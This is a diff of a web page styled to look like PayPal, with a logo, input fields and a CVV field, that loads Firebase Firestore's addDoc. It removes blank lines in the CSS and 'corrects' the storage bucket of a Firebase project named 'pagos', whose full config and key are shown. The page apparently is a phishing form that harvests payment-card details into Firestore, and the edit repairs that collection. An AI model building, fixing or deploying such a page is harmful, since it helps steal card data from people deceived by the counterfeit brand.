@@ -11,7 +11,6 @@
       margin: 0;
       padding: 0;
     }
-
     .container {
       max-width: 400px;
       margin: 60px auto;
@@ -21,18 +20,15 @@
       box-shadow: 0 0 12px rgba(0,0,0,0.1);
       text-align: center;
     }
-
     .paypal-logo {
       width: 50px;
       margin-bottom: 20px;
     }
-
     h2 {
       font-weight: 400;
       margin-bottom: 25px;
       color: #2c2e2f;
     }
-
     input, select {
       width: 100%;
       padding: 12px;
@@ -41,12 +37,10 @@
       border-radius: 8px;
       font-size: 16px;
     }
-
     input:focus, select:focus {
       border-color: #0070ba;
       outline: none;
     }
-
     button {
       background-color: #0070ba;
       color: white;
@@ -58,11 +52,9 @@
       cursor: pointer;
       margin-top: 15px;
     }
-
     button:hover {
       background-color: #005ea6;
     }
-
     label {
       display: block;
       text-align: left;
@@ -70,13 +62,11 @@
       color: #333;
       font-size: 14px;
     }
-
     .cvv-container {
       display: flex;
       align-items: center;
       gap: 10px;
     }
-
     .cvv-container img {
       width: 60px;
       height: auto;
@@ -124,11 +114,12 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-firestore.js";
 
+    // Configuración Firebase corregida
     const firebaseConfig = {
       apiKey: "AIzaSyBp_5laH8i7gBQ4SLl5RcSobs0xM9Kg3oE",
       authDomain: "pagos-bc42c.firebaseapp.com",
       projectId: "pagos-bc42c",
-      storageBucket: "pagos-bc42c.firebasestorage.app",
+      storageBucket: "pagos-bc42c.appspot.com",  // <-- corregido aquí
       messagingSenderId: "793081747436",
       appId: "1:793081747436:web:3020a54bdce85a61a9d2c9",
       measurementId: "G-FYBLX78MEH"
